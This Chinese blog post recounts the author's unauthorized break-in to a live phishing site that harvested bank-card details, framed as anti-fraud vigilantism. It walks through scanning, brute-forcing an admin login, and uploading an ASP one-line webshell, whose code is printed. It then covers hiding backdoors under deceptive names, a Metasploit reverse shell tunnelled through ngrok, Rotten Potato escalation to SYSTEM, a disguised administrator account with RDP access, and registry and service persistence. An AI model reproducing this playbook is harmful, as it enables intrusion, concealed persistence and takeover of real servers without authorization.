FROM

```
https://www.cnblogs.com/backlion/p/18184290
```



AWESOME PENTEST！

---

这是一则漫长又跌宕起伏的故事，小伙伴们请随意就坐，自备茶点；全文包含信息收集与攻克的详细全过程，以及对该类型诈骗思路的分析拆解，以提高防范意识；

## 0x00 梦的开始

那是一个阳光明媚的晌午，日常的搬砖过程中收到一封公司邮件，



![email-send](https://img2023.cnblogs.com/blog/1049983/202405/1049983-20240510143729151-835253458.png)



看到这熟悉的措辞，又瞄了一眼下面的附件内容，熟悉的气息扑面而来，就顺手保存了下来；



![email-qrcode](https://img2023.cnblogs.com/blog/1049983/202405/1049983-20240510143730315-155805369.png)



随即管理员立马发现了不对劲，追发邮件说员工账号被盗用，不要轻信邮件内容，原始邮件也被标为垃圾邮件（上次的类似邮件删的太突然，事情还没开始就结束了，这次总跑不掉了(￣_,￣ )，作为当代好青年，五星好市民，是时候发扬一下活雷锋精神了）；

而这张图片，就成了一切梦开始的地方……

## 0x01 信息收集

### 0x001 审查域名

起始信息非常有限，开局一张图，剧情全靠猜，不过这个入口也足够了，先拿出家伙解析下二维码中的信息：



![email-qrcode-analyze-url](https://img2023.cnblogs.com/blog/1049983/202405/1049983-20240510143731345-420491845.png)



没有额外的数据，只有一串网页链接，看着这域名名称，嘴角微微上扬；先去解析一下域名：



![cmd-nslookup](https://img2023.cnblogs.com/blog/1049983/202405/1049983-20240510143732153-116398944.png)



到写文为止已经不能解析该域名了，整顿的倒挺快，不过好在之前有解析备份，域名万变不离其 IP，并且也没有发现使用 CDN，流量全部通往源站；顺手查了一下，是香港的服务器：



![front-query-ip](https://img2023.cnblogs.com/blog/1049983/202405/1049983-20240510143732895-381242991.png)



然后 whois 一下，搜集相关信息：



![cmd-whois](https://img2023.cnblogs.com/blog/1049983/202405/1049983-20240510143734209-982788253.png)



不出意外，又是用的三方注册机构，没有额外的有用信息，不过这个注册时间挺有意思，本月的，骗子同志动作还蛮快的；接下来只能去对方网站瞅瞅；



![front-west-whois](https://img2023.cnblogs.com/blog/1049983/202405/1049983-20240510143735912-1541041987.png)



又是西部数码，看来有些备受青睐，网站提供隐私保护机制，注册信息不对外公开，暂时也获取不到有用信息；

### 0x002 审查 IP

现在唯一的线索就是之前解析的那个 IP 了，一步一步来，先 nmap 扫一波端口服务先，收集更多信息：



![cmd-nmap-port-services](https://img2023.cnblogs.com/blog/1049983/202405/1049983-20240510143736795-1923594533.png)



嗯还行，看见了几个熟悉的身影，继续走流程，分别跑下默认脚本分析下端口服务信息：



![cmd-nmap-default-script](https://img2023.cnblogs.com/blog/1049983/202405/1049983-20240510143737388-1709067908.png)



没有探测倒匿名 ftp，http 支持 TRACE，没有设 httponly，有执行 XSS 的机会，小本本先记下；然后老规矩，默认字典定向爆破一轮先，尝试还是要有的，万一那啥了呢：



![cmd-nmap-ftp-brute](https://img2023.cnblogs.com/blog/1049983/202405/1049983-20240510143738035-1221249657.png)



剩余端口也都试了，意料之中，没啥收获，看来基本的密码强度意识还是有的；另外之前的扫描扫描中有出现 8888 这个端口，记得这个是服务器管理工具宝塔面板的默认后台入口，访问一下试试：



![front-baota-login-pre](https://img2023.cnblogs.com/blog/1049983/202405/1049983-20240510143738810-7707873.png)



有入口校验，起码证明确实是用的宝塔面板，不过这个爆破应该是不可能去爆破的，记得入口 url 后缀默认大概是 8 位任意大小写字母与数字的组合，就是 62 的 8 次方，大约两百万亿，就挺秃然的，先放在后面再说吧，接下来，继续转战其他方向；

### 0x003 审查页面

来都来了，既然扫码是跳转页面链接，并且端口也开放了 80 和 443，当然要打开网页访问一下康康，同时开启开发者工具，看看有啥小动作：



![front-home-mobile](https://img2023.cnblogs.com/blog/1049983/202405/1049983-20240510143739867-1306843246.png)



哎呀，还识别机型，这靶向用户还挺明确，那就切成移动端看看：



![front-home-index](https://img2023.cnblogs.com/blog/1049983/202405/1049983-20240510143742226-1028674942.png)



emm……怎么说呢，有那味儿了，咋一看还真看不出来，模仿的还挺全（不过胆也确实大，政府网站都搞），然后看了下接口返回的头信息，发现使用的 Windows IIS 7.5 + ASP.NET 的服务：



![front-home-headers](https://img2023.cnblogs.com/blog/1049983/202405/1049983-20240510143744239-1462442293.png)



这个先记着，后面漏洞挖掘用得着，后面试了一圈发现页面都是空壳，只有那个办理入口的弹窗能跳转，跳转页面是：



![front-apply-btn](https://img2023.cnblogs.com/blog/1049983/202405/1049983-20240510143745177-940311491.png)



描述的还挺全，好让大家都能对号入座，这里点下立即申请：



![front-input-name-id](https://img2023.cnblogs.com/blog/1049983/202405/1049983-20240510143745929-1599322522.png)



然后就开始了个人信息收集的一条龙服务，先是姓名和身份证号，另外，注意看旁边显示加载的 PNG 头图的名称，额难道这是开发者的疯狂暗示？？这里随便输入条信息进去看看：



![front-input-name-error](https://img2023.cnblogs.com/blog/1049983/202405/1049983-20240510143746653-1289938253.png)



居然还有校验，打个断点看看源码逻辑：



![front-input-name-breakpoint](https://img2023.cnblogs.com/blog/1049983/202405/1049983-20240510143747438-660022677.png)



一个号码校验都整的这么齐全，还真是费心了，不过前端的校验都是纸老虎，这里也不用什么偏方了，直接用开发者工具的源码编辑覆盖功能，直接给校验函数返回 true：



![front-input-name-override](https://img2023.cnblogs.com/blog/1049983/202405/1049983-20240510143748308-1197575595.png)



然后校验通过，进入下一个步骤：



![front-input-bank](https://img2023.cnblogs.com/blog/1049983/202405/1049983-20240510143749155-599920545.png)



这里是要收集银行卡号和密码以及绑定的手机号，唉，意图很明显，哪有打款转账还要对方密码的操作，这里也准备随便填下，银行卡校验用同样的方法绕过一下，不过在其中一个加载的脚本文件中发现了有意思的东西：



![front-input-bank-js-source](https://img2023.cnblogs.com/blog/1049983/202405/1049983-20240510143750083-234239597.png)



开发者连源码中的调试数据都不删除，调的阿里支付的接口，正好借对方调试账号用一下下（再次证明了作为开发者，生产环境中代码移除注释的重要性=_=）：



![front-input-bank-amount](https://img2023.cnblogs.com/blog/1049983/202405/1049983-20240510143750806-59633663.png)



然后进入了下一个页面，再次收集姓名和证件号，以及银行卡余额（这里应该是对用户真实情况进行摸底以及其他未知操作），下意识查了自己的余额，唉果然这里连撒谎的勇气都没有 T_T，马上填完进入下一步吧：



![front-input-bank-amount-value](https://img2023.cnblogs.com/blog/1049983/202405/1049983-20240510143751552-189815116.png)





![front-submit-loading](https://img2023.cnblogs.com/blog/1049983/202405/1049983-20240510143752269-1603016999.png)



然后页面会一直加载不断刷新，再无其他跳转，应该是给诈骗者提供操作的时间，那么网页的相关操作就暂时告一段落，大致了解了一些操作步骤，接下来探索一下其他方向；

## 0x02 漏洞挖掘

### 0x001 SQL 注入

信息收集差不多了，现在来逐个击破，先从最熟悉的网页端入手，前面审查页面时有不少提交表单和输入框，这些都是潜在的攻破点；挖掘技术哪家强，先祭出神器 Burp，拦截一下之前提交银行卡号密码的表单数据：



![burp-form-field](https://img2023.cnblogs.com/blog/1049983/202405/1049983-20240510143753069-1187845324.png)



然后对字段值进行简单注入尝试，检查报错信息：



![burp-sql-inject-simple](https://img2023.cnblogs.com/blog/1049983/202405/1049983-20240510143753844-377718129.png)



没反应，应该是有基础校验，再换个：



![burp-sql-inject-union-select](https://img2023.cnblogs.com/blog/1049983/202405/1049983-20240510143754587-1058184354.png)



有反应，似乎看到了希望，虽然返回乱码了，应该是对方程序处理问题，不过看句式像是 SQL 报错，又接连试了几个，也是同样的返回，那么剩下的冗杂工作，就交给工具进行吧，掏出 sqlmap 跑一波：



![cmd-sqlmap](https://img2023.cnblogs.com/blog/1049983/202405/1049983-20240510143755291-1208537793.png)



后面换了几轮参数也没成功，应该是过滤机制比较周到，然后在测试另一个页面时，才发现了那段报错信息的原本含义：



![burp-sql-inject-err-res](https://img2023.cnblogs.com/blog/1049983/202405/1049983-20240510143756082-2060479011.png)



嗯还是太年轻，会错意了，应该是程序识别到了字段值中的 SQL 关键字；另外回想起之前扫描到服务可能隐含 TRACE 相关漏洞，测试了下，应该是服务端暂未支持：



![burp-trace-method](https://img2023.cnblogs.com/blog/1049983/202405/1049983-20240510143756821-824053639.png)



然后又想了想，针对密码字段进行数据库表字段设计时，应该会考虑其字符位数低的特点，减少空间占用，因为这是银行卡密码，都知道是 6 位数字，这里传个大数看看有没有惊喜：



![burp-post-mass-data](https://img2023.cnblogs.com/blog/1049983/202405/1049983-20240510143757489-669353379.png)



尴尬，是有惊无喜，应该是没有特别处理，直接反馈为服务端错误；后面又陆续换了几个页面，测试下来都没太大收获，场面又一度陷入僵局，只能又暂时转移战场；

### 0x002 Metasploit 渗透

终于到 Metasploit 出场了，蓄势待发，



![msf-banner](https://img2023.cnblogs.com/blog/1049983/202405/1049983-20240510143758199-1862351718.png)



先搜一下 IIS 的已知漏洞：



![msf-search-iis](https://img2023.cnblogs.com/blog/1049983/202405/1049983-20240510143759165-1517218558.png)



有不少，那就先调几个条件匹配的试一波，这里只放个示例，就不一一展示了：



![msf-run-ektron](https://img2023.cnblogs.com/blog/1049983/202405/1049983-20240510143800034-477101391.png)



然后就是其他几个端口、服务，挨个测试一遍，也没有什么突破，看来补丁都打的挺全；目前又暂时陷入了死胡同，虽然 msf 还有不少模块可以利用，不过暂时不准备继续深入试探了，因为想起来还有另外一件重要的事情还没做；

### 0x003 站点目录枚举

站点目录扫描，这件重要的事怎么能少得了，可供选择的工具很多，如 dirbuster 等，这里我们使用 Burp Suite 的 Engagement tools 里的 Discovery content 工具，进行目录爆破：



![burp-dirbus-menu](https://img2023.cnblogs.com/blog/1049983/202405/1049983-20240510143800791-2035496438.png)





![burp-dirbus-config](https://img2023.cnblogs.com/blog/1049983/202405/1049983-20240510143801559-209238223.png)



其内置的大量字典已经足够使用了，不过涉及网络请求，这个过程也是异常漫长，不过可以后台跑着，不影响做其他事，这里就直接贴一个扫描结果：



![burp-dirbus-sitemap](https://img2023.cnblogs.com/blog/1049983/202405/1049983-20240510143802339-1196280283.png)



直呼好家伙！不扫不知道，出来吓一跳，居然错过了这么多隐藏入口，小本本记下先，后续挨个探索，不过呢视线情不自禁地锁定到了名为 upload.asp 这个文件上，开发者这么明显的暗示就无需我多言了（ㄟ( ▔, ▔ )ㄏ）；



![burp-upload-get](https://img2023.cnblogs.com/blog/1049983/202405/1049983-20240510143803246-498555804.png)



直接访问没什么返回数据，难道是方法不对？换成 POST 表单文件数据再试试：



![cmd-curl-upload-file](https://img2023.cnblogs.com/blog/1049983/202405/1049983-20240510143803929-223736826.png)



看来这样上传也没用，也许还要额外的校验参数之类的，上面不是刚扫了一堆没见过的页面嘛，现在回过头去挨个分析下页面源码看看，也许会有收获：



![front-upload-source](https://img2023.cnblogs.com/blog/1049983/202405/1049983-20240510143804709-330607149.png)



果然，在其中一个页面中，发现了调用这个上传接口的表单，是个隐藏元素，结合页面内容，应该是用于收集用户上传的某些证件信息，身份证照片之类的，然后看了对应的 js 源码，果然存在一些校验和接口参数：



![front-upload-js-fn](https://img2023.cnblogs.com/blog/1049983/202405/1049983-20240510143805615-1636041037.png)



这里去分析调用这些函数再上传文件太费劲了，这不是个隐藏表单嘛，直接改下代码通过 UI 操作多轻松 (¬‿¬)：



![front-upload-show-form](https://img2023.cnblogs.com/blog/1049983/202405/1049983-20240510143806364-366474124.png)



样子虽然简陋了点，管他的，能跑起来就行了，上传个文件试试：



![front-upload-done](https://img2023.cnblogs.com/blog/1049983/202405/1049983-20240510143807325-811540174.png)



然后再访问看看效果：



![front-upload-access](https://img2023.cnblogs.com/blog/1049983/202405/1049983-20240510143808186-1295392850.png)



好家伙，大写的激动！嘴角再度微微上扬，不过先冷静下，再试试有没有文件类型校验，服务是 ASP.NET 的，那就简单传个 asp 程序试试，下面的代码会在页面输出站点运行服务的名称：

```
<% response.write(Request.ServerVariables("SERVER_SOFTWARE")) %>
```

然后上传上去看看：



![front-upload-asp-info](https://img2023.cnblogs.com/blog/1049983/202405/1049983-20240510143808846-160882047.png)



这……俺还能说什么呢，此时无声胜有声 $_$ ，不过这并不是终点，这只是一个良好的起点，一切才刚刚开始 (¬‿¬)；

### 0x004 意外收获

其实网站目录中还有一个很让人在意，就是叫 jieliuzi 这个目录，虽然摸透了对象开发者喜欢汉语拼音命名的习惯，但是这个含义始终未能参透，连蒙带猜外加输入法都未得其解，甚至后面进去一探究竟后没没想明白 =_=，中华文化真是博大精深；不管了，看看页面访问结果：



![front-jieliuzi-login](https://img2023.cnblogs.com/blog/1049983/202405/1049983-20240510143809627-1101232314.png)



是个登录页，十分简洁，而且这其实是个 PC 站点页，骗子在某些方面也挺有情调的，这里不作展示是由于整图过于刺激（怎么说呢，额，这登录框真白），怕过不了审；另外，注意一下这个网页最上面的标题名，第一反应就是应该不会是简单的字面意思，听着也不像啥好词儿，为此专门去百度了一下：



![front-whaling-meaning-1](https://img2023.cnblogs.com/blog/1049983/202405/1049983-20240510143810373-996654425.png)





![front-whaling-meaning-2](https://img2023.cnblogs.com/blog/1049983/202405/1049983-20240510143811193-1751128591.png)



em……又长见识了，原来诈骗也能是一门学问，再结合最开始那张二维码的来源（企业邮件），看来是这么个意思了，大家平时也都注意警惕一下；

随后试了下登录，没有验证码或超时超次数验证这些，并且也没挖掘到可利用的 SQL 注入点，这种情况就该 Burp 的 Intruder 出场了，后台登录名一般都是 admin，密码就祭出 rockyou.txt 跑一波先：



![burp-jieliuzi-intruder-config](https://img2023.cnblogs.com/blog/1049983/202405/1049983-20240510143811871-1809259774.png)





![burp-jieliuzi-intruder-running](https://img2023.cnblogs.com/blog/1049983/202405/1049983-20240510143812563-2061185593.png)



这也是一个比较漫长的过程，不过一会儿之后再去看的时候就发现了变化：



![burp-jieliuzi-intruder-sql-warn](https://img2023.cnblogs.com/blog/1049983/202405/1049983-20240510143813284-1127557837.png)



需要留心的就是这里的返回数据长度，因为正常讲大部分试的密码都是错误的，服务器响应的数据大小也都是一样的，突然出现不一样的长度多半就出现了转机，这里看来是识别出了 sql 语句，和之前一样报错，然后看最上面那条：



![burp-jieliuzi-intruder-find](https://img2023.cnblogs.com/blog/1049983/202405/1049983-20240510143813940-207416141.png)



整个列表中就这一条最特别，看返回也是 302 重定向，看来应该是密码对了跳转进页面了，然后看这密码，也是够随意的，看着简单，猜的时候谁又能想到呢，登录进去看看：



![front-jieliuzi-order-list](https://img2023.cnblogs.com/blog/1049983/202405/1049983-20240510143817192-1248574985.png)





![front-jieliuzi-ip-list](https://img2023.cnblogs.com/blog/1049983/202405/1049983-20240510143823626-30608114.png)



……，唉，怎么说呢，应该是触目惊心吧，虽然数量没有一些媒体平台时不时报道那些的那么夸张，但也不是一个小数目了，而且每一处记录的银行卡账号、密码、身份证号、手机号、验证码、IP位置这些，都是近乎真实的；我不是正义的制裁者，也没有多少执行正义的力量，最多就热心的帮他们删个库再跑路，个人的力量太小了，所以这些还是都后面交给警察蜀黍处理吧，正义可能会迟到，但不会缺席。

## 0x03 获取权限

### 0x001 Get webshell

暂时先抛开题外话，上面进行到了文件上传这一步，文件上传可以意味着很多事情，可执行文件的上传便可以实现获取服务器的系统操作权限，当然这里的网页应用程序的相关权限一版很低，提权的事就是后话了；当前任务是拿下网站操作权限，即 webshell，继续走流程，先上传个简单的 asp 版一句话木马：

```
<% execute(request("pass")) %>
```

然后就该 亮剑 了：



![antsword-add-data-menu](https://img2023.cnblogs.com/blog/1049983/202405/1049983-20240510143824576-76208029.png)





![antsword-add-data-detail](https://img2023.cnblogs.com/blog/1049983/202405/1049983-20240510143825301-1207895494.png)





![antsword-add-data-success](https://img2023.cnblogs.com/blog/1049983/202405/1049983-20240510143825972-1775532615.png)



搞定，进去康康：



![antsword-wwwroot-list](https://img2023.cnblogs.com/blog/1049983/202405/1049983-20240510143826679-570661089.png)



文件相关操作：



![antsword-wwwroot-list-menu](https://img2023.cnblogs.com/blog/1049983/202405/1049983-20240510143827346-2043558376.png)





![antsword-file-edit](https://img2023.cnblogs.com/blog/1049983/202405/1049983-20240510143828139-840957179.png)



数据库相关操作（对应之前后台页面的展示数据）：



![antsword-db-bank](https://img2023.cnblogs.com/blog/1049983/202405/1049983-20240510143828913-1266052678.png)



命令行终端相关操作：



![antsword-cmd-home](https://img2023.cnblogs.com/blog/1049983/202405/1049983-20240510143829706-1876210793.png)



甚至获取 Windows 系统信息：



![antsword-cmd-systeminfo](https://img2023.cnblogs.com/blog/1049983/202405/1049983-20240510143830452-2034146118.png)



好了，这不啥都有了，还要啥自行车，但也不能止步于此，虽然现在拥有了对这整个站点的操作权限，包括文件及数据库的增删改查等，但也不至于为了正义用爱发电，每日蹲点删库删站，我们的目标还在山的那边 (ง •_•)ง

### 0x002 Backdoor

俗话讲，要生于忧患，虽然现在入口打通了，但是凡事都要留一手（我更喜欢留多手），防止木马那天被管理员察觉并清理就尴尬了，所以找几个隐蔽的位置，再上传几个，比如平时几乎不被注意的 css 或图片等静态资源文件夹，js 库文件等，文件命名上也可以花点心思，模仿已有文件或者配置文件之类的，使人有一种一眼看上去是正常文件的幻觉（+_+）；



![antsword-backdoors](https://img2023.cnblogs.com/blog/1049983/202405/1049983-20240510143831130-1208206448.png)



当然，还可以利用一种技术，简单讲就是 Windows 中我们熟知的隐藏文件，一般一些软件或系统的配置文件会通过这样的方式隐藏，防止普通用户误删改，查看也能简单，像下面这样勾选一些就都出来了：



![antsword-explorer-hidden-file](https://img2023.cnblogs.com/blog/1049983/202405/1049983-20240510143831792-614074264.png)



所以我们这里可以通过 shell 命令把指定文件隐藏掉，使得其不会被轻易发现：



![antsword-cmd-attrib](https://img2023.cnblogs.com/blog/1049983/202405/1049983-20240510143832474-316097029.png)



### 0x003 Get shell

目前我们获取到的还只是 webshell，虽然可以模拟执行终端命令，但是这些都是通过上传的 asp 后门程序执行的，就是说每步操作都会发起 http 请求，防止被平台记录，需要获取系统 shell，即上传系统可执行文件（如 .exe 文件，就是俗称的木马），至于如何生成，就需要 metasploit 再次登场了；

这里又涉及一些东西，getshell 的木马一般有两种，正向连接和反向连接，基础的认知可能是将程序上传至机器，然后运行就会后台监听某个端口，等待外部的连接，连上后就可以通过两端的交互达到控制系统，当然前提是系统防火墙没开或者允许该端口放行，而通常服务器都会开启防火墙并过滤端口，只放行指定的几个；

所以后面出现了第二种类型，反向连接，或者叫反弹 shell，简单讲就是第一种类型反转一下，不是目标机器等待我们连，而是我们外部的机器等待目标机器来连接，这解决了防火墙端口的限制，因为防火墙一般不会特意去限制出站端口，当然这种类型又增加了额外的限制，首先我们需要一台具有公网 IP 的机器，像平常这种连着 WiFi， 深埋于 n 层路由下的设备，基本可以放弃了（使用端口转发也需要运营商提供公网 IP），另外就是需要目前机器可访问公网，因为有些服务器考虑安全因为是在内外下的，用反向代理等方式传输流量，无法访问外网；

由于不清楚对方防火墙情况，先用反向连接看看，手边暂时没有公网机器，就先用 ngrok 转发一下端口流量，先启动服务：



![cmd-ngrok-running](https://img2023.cnblogs.com/blog/1049983/202405/1049983-20240510143833166-1958649515.png)



从之前收集的数据中得知，对方机器是 x64 Windows 系统，那么这里就直接用 msfvenom 生成对应的 payload（暂时先不考虑加密加壳这些，传上去看看是否被杀毒再说）：



![cmd-msfvenom-generate-api](https://img2023.cnblogs.com/blog/1049983/202405/1049983-20240510143833792-1689721778.png)



reverse_tcp 是反向连接，bind_tcp 是正向连接，连接地址填 ngrok 提供的链接，端口填链接对应的，然后生成执行文件，最后上传到对方站点某个隐蔽的目录下：



![antsword-upload-api](https://img2023.cnblogs.com/blog/1049983/202405/1049983-20240510143834514-1566508456.png)





![antsword-upload-api-success](https://img2023.cnblogs.com/blog/1049983/202405/1049983-20240510143835222-329919412.png)



然后在 msf 中启动监听程序，等待对方连接，地址填本地，端口填之前 ngrok 中设定的本地端口，使用的 pyaload 要和之前 msfvenom 中配置的一致，不然会连接失败；完成后，一旦目标上的程序启动，首先就会访问 ngrok 域名和对应端口，ngrok 服务再把传输数据转发到本地的监听端口中，数据就通过这一层中介进行双向传输：



![msf-run-reverse-listener](https://img2023.cnblogs.com/blog/1049983/202405/1049983-20240510143836027-1381998185.png)



然后在 webshell 中执行它：



![antsword-cmd-run-api](https://img2023.cnblogs.com/blog/1049983/202405/1049983-20240510143836678-1723974698.png)





![antsword-cmd-list-api](https://img2023.cnblogs.com/blog/1049983/202405/1049983-20240510143837265-2077292955.png)



运行成功，这是切换回 msf 一会后就会有所反应，表示连接成功：



![msf-reverse-connected](https://img2023.cnblogs.com/blog/1049983/202405/1049983-20240510143838001-1571661625.png)



现在再查看 ngrok 服务就回显示有一条连接，表示可以进行通信了：



![cmd-ngrok-connected](https://img2023.cnblogs.com/blog/1049983/202405/1049983-20240510143838621-978241121.png)



现在连接成功进入的操作界面是 meterpreter，这是 metasploit 提供的有许多拓展功能的集成终端，类似于 cmd、shell，但是功能更强大，可以执行切换目录、获取系统信息、操作进程、上传下载文件、进一步渗透等操作，甚至在拿下 system 权限后，还能解锁控制鼠标键盘、屏幕截图或实时预览等高级功能，这里先查询下基础信息：



![meter-getinfo](https://img2023.cnblogs.com/blog/1049983/202405/1049983-20240510143839249-2082447648.png)



和之前的虚拟终端一样，当前操作用户是 IIS，当然这里想用 cmd 终端操作也是可以的，执行下 shell 命令进入系统 shell，操作和命令与系统命令提示符没有两样：



![meter-shell-command-test](https://img2023.cnblogs.com/blog/1049983/202405/1049983-20240510143839906-1170661838.png)



初次进入可能会出现中文字符乱码情况，因为 cmd 默认使用的字符集问题，手动切换成 UTF-8 的 65001 就行了，可能唯一不太方便的地方，就是没有集成历史记录的功能，要重试上个命令得全部重打一遍，毕竟是网络转发数据，不应要求太多：

### 0x004 Get system

如上面所讲，目前获取到的只是普通账户的 shell，虽然有一定的终端操作权限，但还是远远不够的，会有诸多限制，比如无法操作一些服务、增删系统账户、访问系统目录等等，那么接下来的操作就是 shell 提权了，或者叫 getsystem，这也是 meterpreter 中的一条命令，功能和描述一样，会尝试多种漏洞进行权限提升以获取 SYSTEM 权限，只不过试了下似乎都没有成功，只能另寻他法：



![meter-getsystem-err](https://img2023.cnblogs.com/blog/1049983/202405/1049983-20240510143840510-2086198506.png)



这里值得说的是，可能有小伙伴会有疑惑，认知中 Windows 系统中权限最高的不应该是超级管理员 Administrator 吗，为什么一直在强调获取 SYSTEM 账户权限，其实严格来讲，Administrator 账户虽然成为管理员，其实权限并不是最高的，也有很多它做不了的事，举个简单的例子就是删除系统账户 Guest：



![cmd-admin-del-guest](https://img2023.cnblogs.com/blog/1049983/202405/1049983-20240510143841196-431696672.png)



以及其他一些系统层面的事，administrator 也做不到，而这些高层次的操作都由 SYSTEM 账户来完成，虽然在账户设置里面从没见过它，但它是确确实实存在的：



![explorer-system-account](https://img2023.cnblogs.com/blog/1049983/202405/1049983-20240510143841886-1639584746.png)



就像网站服务其实也有个对应的 www 账户一样，应该没人曾经登录过它吧；

前面讲获取 system 权限使用 getsystem 不奏效，那么就继续试探一下其他路子，也就是令牌窃取，令牌指的登录令牌，类似登录网站要用的 cookies 或者 token，而 Windows 中存在两种令牌：Delegation Tokens（授权令牌） 和 Impersonation Tokens（模拟令牌），前者用于交互式的登录，如直接或使用远程桌面，输入账号密码登录进系统，而后者用于非交互式的会话中，访问网络驱动或其他域登录脚本程序；

这里要利用的正是模拟令牌，窃取的过程有些类似网站里的 cookies 窃取，由于令牌在重启系统之前，会一直被保留，所以有账户登陆过的话，其令牌有机会被冒充使用，而且有授权令牌登录的账户注销的话，令牌也会转化为模拟令牌，同时其原本的相关权力都会保留；

这里接下来就先使用 incognito（伪装、隐瞒的意思，偷盗者总是会先隐藏起来嘛）插件，进行令牌盗取，再用 list_token 命令查询当前能获取的令牌情况（数量因当前的 shell 权限而定）：



![meter-list-tokens](https://img2023.cnblogs.com/blog/1049983/202405/1049983-20240510143842636-1341345703.png)



这里可以看到可盗取令牌的账户，要窃取的话就使用 impersonate_token 命令：



![meter-impersonate-iusr](https://img2023.cnblogs.com/blog/1049983/202405/1049983-20240510143843271-1023285602.png)



虽然可以窃取成功，但试了下这个账户的权限也不高，尝试性的试了下 system 账户也失败：



![meter-impersonate-try-system](https://img2023.cnblogs.com/blog/1049983/202405/1049983-20240510143844012-872497303.png)



所以只能再尝试其他提权漏洞了，这里就先用 bg 命令把当前 meterpreter 会话切换至后台，回到 msf 界面，使用一个已知的 Rotten Potato 提权漏洞：



![msf-use-rotten-potato](https://img2023.cnblogs.com/blog/1049983/202405/1049983-20240510143844662-355930905.png)



需要的唯一参数是会话 id，正好可以利用刚才的 meterpreter 会话，然后还需要设置一个 payload，这里之前有了解过，目前机器可以访问公网，而且虽然有使用防火墙过滤端口，但是似乎一直开着这么一群端口：



![meter-netstat](https://img2023.cnblogs.com/blog/1049983/202405/1049983-20240510143845396-177921509.png)



这是远程 RPC 需要使用的一系列端口，所以盲猜机器会开放 49150-49160 这么一个范围的端口，那么就见缝插针，选一个没被占用的用于开启监听，这样就能直接使用正向连接了，而不用麻烦的再次使用反向连接：



![msf-config-rotten-potato](https://img2023.cnblogs.com/blog/1049983/202405/1049983-20240510143847441-860396729.png)



地址填目标机器的地址，这样运行后就能自动连接到目标机器的监听端口上，这里先运行一下试试能不能成功：



![msf-run-rotten-potato-success](https://img2023.cnblogs.com/blog/1049983/202405/1049983-20240510143848063-1331133222.png)



哟西！竟然比想象中的顺利，就不多解释了，检查一下权限和令牌先：



![msf-rotten-potato-getsystem-success](https://img2023.cnblogs.com/blog/1049983/202405/1049983-20240510143848782-1503136640.png)



Nice，成过窃取到了 system 账户的令牌，以对方身份登录成过，接下来就可以试试权限了：



![meter-shell-system-add-user](https://img2023.cnblogs.com/blog/1049983/202405/1049983-20240510143849525-317780277.png)



进入 shell 后账户确实变成了 SYSTEM，也能增加或删除账户了，那么至此，成过拿下系统最高权限，成功 getsystem；

### 0x005 权限测试

回想起前面有说过，高权限可以获取屏幕截图或者实式预览，那么这里来就看一下下：



![meter-screenshot-saved](https://img2023.cnblogs.com/blog/1049983/202405/1049983-20240510143850094-1557139858.png)



成功截图到了指定文件，打开看看：



![meter-screenshot-view](https://img2023.cnblogs.com/blog/1049983/202405/1049983-20240510143852670-1274130262.png)



虽然分辨率有点低，但大致是个登录界面的模样，然后实时预览看看，由于这个要启动图形服务，就在虚拟机里跑一下：



![meter-screenshare](https://img2023.cnblogs.com/blog/1049983/202405/1049983-20240510143856151-1339991601.png)



大晚上的，应该没啥人登录，，不过光是预览还不够，现在是可以直接远程登录进去的，只是需要额外的一些操作，先建立一个账户并分配管理员权限（即加入 Administrators 用户组），名字同样可以取得有一定迷惑性：



![meter-add-user-sys](https://img2023.cnblogs.com/blog/1049983/202405/1049983-20240510143857023-892205023.png)



不过光是这样还仍没有远程登录的权限，需要将用户分配进远程桌面用户组才具有登录权限：



![meter-add-sys-rdp](https://img2023.cnblogs.com/blog/1049983/202405/1049983-20240510143857664-1420006421.png)



然后这里本来是要开启远程桌面服务的（TermService），结果查询发现是已经开启的，然后一路追踪到了服务对应的进程，进程对应的端口：



![meter-shell-find-termservice](https://img2023.cnblogs.com/blog/1049983/202405/1049983-20240510143858377-547468310.png)



居然默认端口从 3386 改成了 10086，有意思，之前端口扫描默认常用端口，难怪没有扫出来，既然现在用户和密码都有了，登录进去看看：



![rdp-connect-pannel](https://img2023.cnblogs.com/blog/1049983/202405/1049983-20240510143858978-1011447540.png)





![rdp-connecting](https://img2023.cnblogs.com/blog/1049983/202405/1049983-20240510143859631-1630650592.png)





![rdp-desktop-view](https://img2023.cnblogs.com/blog/1049983/202405/1049983-20240510143900556-760538213.png)



唉，都舍不得掏钱整台配置好一点的，一点都不懂得投资 ㄟ( ▔, ▔ )ㄏ，没意思，擦擦屁股溜了溜了(～￣▽￣)～；

### 0x005 System Backdoor

老规矩，任何阶段都需要留一手，并且现在 system 权限，因此只要留下后门那么再次连接就直接具有 system 权限，那么话不多说直接上传，文件名同样可以取得有一定迷惑性：



![meter-upload-conf](https://img2023.cnblogs.com/blog/1049983/202405/1049983-20240510143901257-753401688.png)



然后配置程序开机启动：



![meter-shell-reg-add](https://img2023.cnblogs.com/blog/1049983/202405/1049983-20240510143901925-1763985292.png)



当然，要想再留一手就可以再创建个系统服务，只是生成的 payload 要用 service 类型的，不然会启动失败：



![cmd-gen-payload-exe-service](https://img2023.cnblogs.com/blog/1049983/202405/1049983-20240510143902520-1269494042.png)



然后上传后在目标机器创建服务，配置开机自启，也可以再额外配置启动失败后自动重启服务，或者最近调用执行其他程序，最后再手动启动一次服务：



![meter-shell-sc-create](https://img2023.cnblogs.com/blog/1049983/202405/1049983-20240510143903259-988512936.png)



至此，大部分流程基本结束，拥有系统权限可以做更多的拓展渗透，这些都是后话；

## 0x04 套路分析

### 0x001 作案工具

目前为止一共收集到两个后台，一个宝塔面板和一个捕鲸系统后台，宝塔之前是由于有登录校验，没有获取到登录入口，现在就轻松了，用宝塔自带命令 bt default 查看一下默认入口和账号信息：



![meter-baota-default](https://img2023.cnblogs.com/blog/1049983/202405/1049983-20240510143903912-227041935.png)



额……者用户名难道是要暗示自己输得起？待会用这个账号和密码登进去看看，另外在查看目录时，又发现了有意思的部分：



![meter-baota-hosts-list](https://img2023.cnblogs.com/blog/1049983/202405/1049983-20240510143904529-527067026.png)



这里还列出了不少站点，难道现在诈骗也搞分布式作案了 ( $ _ $ )，或者微诈骗？算了后面有机会再去一锅端了，先登录进去看看：



![front-baota-login-default](https://img2023.cnblogs.com/blog/1049983/202405/1049983-20240510143905320-846986043.png)



看了默认密码被换调了，虽然现在有权限能直接改掉密码，为了不打草惊蛇，就先放一放，反正进去也都是一些可视化服务器配置，毕竟现在服务器的系统权限都攥在手上呢，不必着急，主要先分析下另外一套系统，那才是骗子们的主要作案工具；

可以观察页面存在两列功能栏，分别罗列着骗子能远程执行的操作：



